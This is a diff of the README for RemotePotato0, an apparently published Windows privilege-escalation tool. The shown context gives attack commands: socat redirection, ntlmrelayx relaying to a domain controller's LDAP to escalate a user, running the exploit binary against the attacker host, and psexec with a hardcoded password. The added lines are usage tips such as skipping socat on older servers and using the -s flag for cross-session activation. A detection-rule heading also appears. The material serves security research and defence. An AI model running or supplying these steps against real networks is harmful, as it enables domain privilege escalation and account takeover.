@@ -19,12 +19,14 @@ Attacker machine (192.168.83.130):
 sudo socat TCP-LISTEN:135,fork,reuseaddr TCP:192.168.83.131:9998 &
 sudo ntlmrelayx.py -t ldap://192.168.83.135 --no-wcf-server --escalate-user winrm_user_1
 ```
+**Note: if you are on Windows Server <= 2016 you can avoid the network redirector (socat) because the oxid resolution can be performed locally.**
 
 Victim machine (192.168.83.131):
 
 ```
 .\RemotePotato0.exe -r 192.168.83.130 -p 9998
 ```
+**Note2: Remember you can pick an arbitrary session activation with the -s flag, very powerful!**
 
 Victim Domain Controller (192.168.83.135)
 
@@ -36,7 +38,13 @@ psexec.py 'SPLINTER/winrm_user_1:Password111!@192.168.83.135'
 
 ## Demo
 
+### Cross session activation
+<img src="demo_cross_session.gif">
+
+### Shell in session 0
 <img src="demo.gif">
+
+
 
 ## Detection
 
@@ -69,3 +77,4 @@ rule SentinelOne_RemotePotato0_privesc {
 ## Credits
 
 * [Impacket](https://github.com/SecureAuthCorp/impacket)
+* [@tiraniddo](https://twitter.com/tiraniddo) - [Cross Session Activation](https://www.tiraniddo.dev/2021/04/standard-activating-yourself-to.html)
